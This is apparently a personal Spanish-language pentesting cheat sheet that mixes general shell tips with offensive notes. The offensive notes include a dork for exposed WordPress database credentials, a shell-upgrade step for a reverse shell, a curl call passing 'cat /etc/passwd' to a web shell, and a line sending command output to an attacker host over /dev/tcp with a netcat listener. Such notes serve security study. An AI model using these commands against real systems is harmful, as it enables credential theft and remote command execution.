- Kill %  o Kill $!--> matar proceso que acabo de dejar en 2º plano

- Reduce el tamaño de ejecutables 
1. go build -ldflags "-s -w"

- upx ffuf --> le quita peso al binario

- Enviar errors fuera de la terminal y hacer independiente la ventana
1. burpsuite captura.cap &> /dev/null & disown

- Encontrar credens de bases de datos de wordpress
1. inurl:wp-config.php.txt

- Saber Sistema operativo por TTL
 1. https://subinsb.com/default-device-ttl-values/

- Terminal interactiva una vez reverse shell
1. script /dev/null -c bash

- Saber qué shell es
1. echo $0

- Ir al directorio anterior --> pushd, popd

- Poner colores a la lectura de un script
1. cat -l bash

- **rlwrap**
1. Sirve para adaptar las shells de forma interactiva

- **Páginas de crackeo**
1. [Crackthehash](https://hashes.com)
2. [Crackstation](https://crackstation.com)
3. [OnlineHashCrack](https://www.onlinehashcrack.com/)

- Dónde está el binario y ver info con ll sin mover del directorio
1. which nmap | xargs ls -la

- Copiar contenido de un archivo sin meterse en él
```bash
cat archivazo.txt | xclip -sel clip
```


- **ctrl+ u** en una web para que salga un json o cualquier archivo con un formato correcto
- si un user pertenece al grupo **adm**, será capaz de ver los logs de cualquier app
- Para URL encodear y mandar data como con **--data** con curl
```bash
curl -s -X GET "http://localhost:puerto/upload/archivo.php" -G --data-urlencode "cmd=cat /etc/passwd"
```

- PAra enviar comandos a un puerto en escucha



```bash
`whoami > /dev/tcp/ipatacante/8080 0>&1`
nc -nlvp 8080
```